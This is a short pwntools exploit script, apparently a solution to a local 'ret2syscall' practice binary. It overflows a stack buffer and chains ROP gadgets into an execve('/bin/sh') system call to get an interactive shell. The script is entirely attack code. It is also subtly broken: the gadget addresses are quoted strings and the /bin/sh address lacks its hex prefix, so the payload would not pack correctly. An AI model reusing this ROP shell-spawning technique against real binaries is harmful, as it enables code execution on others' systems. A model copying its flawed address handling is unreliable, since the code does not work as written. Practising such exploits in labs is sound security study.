from pwn import *;

io = process("./ret2syscall");

pop_eax_ret = '0x080bb196';
pop_edx_ecx_ebx_ret = '0x0806eb90';
int_80h = '0x08049421';
bin_sh = '080BE408';
#payload = flat([b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_80h]);
payload = flat([b'A' * 112, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, pop_eax_ret, 0xb, int_80h]);

io.sendline(payload);

io.interactive();
